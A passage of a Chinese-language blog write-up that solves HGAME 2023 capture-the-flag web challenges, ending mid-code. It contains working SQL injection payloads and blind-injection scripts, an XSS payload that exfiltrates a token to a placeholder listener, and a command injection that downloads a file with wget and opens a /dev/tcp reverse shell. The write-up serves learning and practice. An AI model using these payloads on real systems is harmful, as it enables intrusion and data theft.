class="line">hgame&#123;Don&#x27;t^put*Git-in_web_directory&#125;</span><br></pre></td></tr></table></figure><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><p>v2board v.1.6.1 机场面板管理接口越权漏洞</p><blockquote><p>分析可参考该<a href="https://zgao.top/v2board-v-1-6-1-%e6%9c%ba%e5%9c%ba%e9%9d%a2%e6%9d%bf%e7%ae%a1%e7%90%86%e6%8e%a5%e5%8f%a3%e8%b6%8a%e6%9d%83%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">博文</a></p></blockquote><p>利用工具<a href="https://github.com/zgao264/v2board-exp">https://github.com/zgao264/v2board-exp</a></p><p>在<code>_api_v1_admin_user_fetch.json</code>中找到<code>admin</code>的<code>token</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;invite_user_id&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;telegram_id&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin@example.com&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;$2y$10$JLs3LJrKqsTly8K.w9KzI.e0Jt\/7oU9W3gQYcUDSRjg1LReimLLTS&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password_algo&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;password_salt&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;discount&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;commission_type&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;commission_rate&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;commission_balance&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;t&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;u&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;d&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;transfer_enable&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;banned&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;is_admin&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;is_staff&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;last_login_at&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;last_login_ip&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;uuid&quot;</span><span class="punctuation">:</span><span class="string">&quot;85a1c66e-d736-42b2-a0da-69f6fb066e90&quot;</span><span class="punctuation">,</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;plan_id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;remind_expire&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;remind_traffic&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;39d580e71705f6abac9a414def74c466&quot;</span><span class="punctuation">,</span><span class="attr">&quot;remarks&quot;</span><span class="punctuation">:</span><span class="keyword">null</span><span class="punctuation">,</span><span class="attr">&quot;expired_at&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span><span class="number">1673263308</span><span class="punctuation">,</span><span class="attr">&quot;updated_at&quot;</span><span class="punctuation">:</span><span class="number">1673267067</span><span class="punctuation">,</span><span class="attr">&quot;total_used&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;plan_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Vidar-Team Plane\ud83d\udee9&quot;</span><span class="punctuation">,</span><span class="attr">&quot;subscribe_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;http:\/\/week-2.hgame.lwsec.cn:31624\/api\/v1\/client\/subscribe?token=39d580e71705f6abac9a414def74c466&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;total&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>包裹上<code>hgame</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;39d580e71705f6abac9a414def74c466&#125;</span><br></pre></td></tr></table></figure><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><p>爆破得到密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username：user01</span><br><span class="line">password：admin123</span><br></pre></td></tr></table></figure><p>登陆进去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search_id=1</span><br><span class="line">hard disk 1</span><br></pre></td></tr></table></figure><p>测试了下发现<code>ban</code>了一些字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select and or union 空格 /**/ database =</span><br></pre></td></tr></table></figure><p>但是<code>大写</code>可以绕过，因此可以直接注出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示2 3</span><br><span class="line">search_id=(-1)Union/*a*/SelEct/*a*/1,2,3</span><br><span class="line"># se4rch 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,DATABASE(),3</span><br><span class="line"># 5ecret15here,L1st,user1nf0 3 (这里注意information里面有个or)</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(TABLE_NAME)FROM/*A*/INFORMATION_SCHEMA.TABLES/*A*/WHERE/*A*/TABLE_SCHEMA/*A*/LIKE/*A*/DATABASE()),3</span><br><span class="line"># f14gggg1shere 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(COLUMN_NAME)FROM/*A*/INFORMATION_SCHEMA.COLUMNS/*A*/WHERE/*A*/TABLE_NAME/*A*/LIKE/*A*/&quot;5ecret15here&quot;),3</span><br><span class="line"># hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125; 3</span><br><span class="line">search_id=(-1)UNION/*A*/SELECT/*A*/1,(SELECT/*A*/GROUP_CONCAT(f14gggg1shere)/*A*/FROM/*A*/5ecret15here),3</span><br></pre></td></tr></table></figure><p>也可以写脚本盲注（我写的很暴力）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118/search&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_ga=GA1.1.41308100.1673534855; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3MzY4NjE2MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18p83DrKePiU6Cm-ll27huH1r-VNy8S_bQHxrgpjDZg9U=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;week-2.hgame.lwsec.cn:32118&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://week-2.hgame.lwsec.cn:32118/home&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">old_res = res</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line"><span class="comment"># 数据库 se4rch</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(Database())),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表名 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># 也可以用DATABASE()代替数据库名</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(GROUP_CONCAT(TABLE_NAME))FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA)LIKE(&quot;se4rch&quot;)),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列名 f14gggg1shere</span></span><br><span class="line"><span class="comment"># payload = f&#x27;ascii(mid((SELECT(GROUP_CONCAT(COLUMN_NAME))FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME)LIKE(&quot;5ecret15here&quot;)),&#123;i&#125;,1))^&#123;j&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</span></span><br><span class="line">payload = <span class="string">f&#x27;ascii(mid((SELECT(GROUP_CONCAT(f14gggg1shere))FROM(5ecret15here)),<span class="subst">&#123;i&#125;</span>,1))^<span class="subst">&#123;j&#125;</span>&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">response = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="comment"># result = re.findall(r&#x27;&lt;div id=&quot;result&quot;&gt;(.*?)&lt;/div&gt;&#x27;, response.text, re.S)[0]</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> response.text):</span><br><span class="line">res += <span class="built_in">chr</span>(j^<span class="number">1</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> res == old_res:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><p>直接<code>admin</code>登录，<code>share</code>页面有提示<code>admin will see it later</code></p><p>审计源码后发现<code>register</code>路由有<code>flag</code>，但是要内部访问</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/register&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">  <span class="keyword">let</span> flag = <span class="string">&quot;hgame&#123;fake_flag_here&#125;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&quot;127.0.0.1&quot;</span> || req.<span class="property">ip</span> == <span class="string">&quot;::ffff:127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    flag = <span class="string">&quot;hgame&#123;true_flag_here&#125;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123; username, flag &#125;, secret)</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; token &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>该路由存在<code>xss</code>漏洞，禁用了一些字符，但可以用<code>eval</code>和<code>atob</code>绕过</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span class="regexp">/on/i</span>, <span class="regexp">/localStorage/i</span>, <span class="regexp">/alert/</span>, <span class="regexp">/fetch/</span>, <span class="regexp">/XMLHttpRequest/</span>, <span class="regexp">/window/</span>, <span class="regexp">/location/</span>, <span class="regexp">/document/</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> req.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> item <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.<span class="title function_">test</span>(key.<span class="title function_">trim</span>()) || item.<span class="title function_">test</span>(req.<span class="property">query</span>[key].<span class="title function_">trim</span>())) &#123;</span><br><span class="line">        req.<span class="property">query</span>[key] = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&quot;preview&quot;</span>, &#123; <span class="attr">data</span>: req.<span class="property">query</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>利用<code>share</code>路由来插入<code>payload</code>和访问</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.<span class="title function_">encode</span>(req.<span class="property">body</span>)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>编写<code>payload</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://127.0.0.1:9090/user/register&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;applicationjson&#x27;</span>);</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> xhr1 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr1.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://XXX.XXX.XX.XX:XXXX/&quot;</span>+xhr.<span class="property">responseText</span>);</span><br><span class="line">    xhr1.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br></pre></td></tr></table></figure><p>本地开启监听，在<code>share</code>直接打</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/button/share</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZmxhZyI6ImhnYW1le2Zha2VfZmxhZ19oZXJlfSIsImlhdCI6MTY3Mzg4MDk1OX0.1TQg2QY5w4KiQ41LplIvQ6HCxXeSehgWosd5gFoi7Ho</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>714</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_ga=GA1.1.41308100.1673534855; dark_mode=0; _ga_P1E9Z5LRRK=GS1.1.1673534854.1.1.1673536392.0.0.0; SESSION=MTY3MzY4NjE2MXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18p83DrKePiU6Cm-ll27huH1r-VNy8S_bQHxrgpjDZg9U=</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-2.hgame.lwsec.cn:30104</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://week-2.hgame.lwsec.cn:30104</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://week-2.hgame.lwsec.cn:30104/button/edit</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">&#123;<span class="string">&quot;border-radius&quot;</span>:<span class="string">&quot;100px&quot;</span>,<span class="string">&quot;background-color&quot;</span>:<span class="string">&quot;#000000&quot;</span>,<span class="string">&quot;color&quot;</span>:<span class="string">&quot;#ffffff&quot;</span>,<span class="string">&quot;border-width&quot;</span>:<span class="string">&quot;1px&quot;</span>,<span class="string">&quot;box-shadow&quot;</span>:<span class="string">&quot;3px 3px #000&quot;</span>,<span class="string">&quot;test&quot;</span>:<span class="string">&quot;\&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;此处写入base64加密后的payload即可&#x27;</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;\<span class="string">&quot;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>然后查看监听得到<code>token</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoiaGdhbWV7Yl9jNHJlX2FiMHV0X3Byb3AzcnQxdHlfaW5qRWN0aU9ufSIsImlhdCI6MTY3Mzg4MTMyNn0.9cL849te3rbTdSDeEhR4Hy3TYk7VuL2nsJlu8aidjP4&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>去<a href="https://jwt.io/%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF">https://jwt.io/解密即可</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hgame&#123;b_c4re_ab0ut_prop3rt1ty_injEctiOn&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1673881326</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><p>登录界面存在<code>sql</code>注入，测试后发现禁用一些字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">= 空格 union like and</span><br></pre></td></tr></table></figure><p>使用<code>regexp</code>盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-_&#125;&#123;,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://week-3.hgame.lwsec.cn:31678/login&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># 数据库 l0g1nme </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select/**/database()/**/regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 表名 User1nf0mAt1on</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(table_name)from/**/information_schema.tables)regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 列名 id,usern4me,passw0rd</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/\&quot;User1nf0mAt1on\&quot;)regexp(\&quot;^&#123;flag+j&#125;\&quot;))#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 用户名 hgAmE2023HAppYnEwyEAr,testuser</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;a&#x27;or(select(select/**/group_concat(usern4me)from/**/User1nf0mAt1on)regexp/**/binary/**/\&quot;^&#123;flag+j&#125;\&quot;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 密码 WeLc0meT0hgAmE2023hAPPySql,testpassword</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;a&#x27;or(select(select/**/group_concat(passw0rd)from/**/User1nf0mAt1on)regexp/**/binary/**/\&quot;^<span class="subst">&#123;flag+j&#125;</span>\&quot;)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Success&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意最后结果要区分<code>大小写</code>，使用该账户登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=WeLc0meT0hgAmE2023hAPPySql&amp;username=hgAmE2023HAppYnEwyEAr</span><br></pre></td></tr></table></figure><p>登陆后访问<code>\home</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</span><br></pre></td></tr></table></figure><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><p>部署一个恶意文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/xxx.xxx.xx.xx/xxxxxx 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>先下载恶意文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1|wge\t%09http://xxx.xxx.xx.xx/exp</span><br></pre></td></tr></table></figure><p>然后反弹shell即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1|bas\h%09exp</span><br></pre></td></tr></table></figure><p>在根目录下得到flag</p><p><img src="https://cdnjson.com/images/2023/02/05/ping.png" alt="ping.png"></p><p>顺路看下源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        ip = request.form.get(<span class="string">&quot;ip&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ip:</span><br><span class="line">            mes = <span class="string">&quot;Your ip cannot be empty&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, message=mes)</span><br><span class="line">        invalid = waf(ip)</span><br><span class="line">        <span class="keyword">if</span> invalid:</span><br><span class="line">            mes = <span class="string">&quot;Waf!&quot;</span></span><br><span 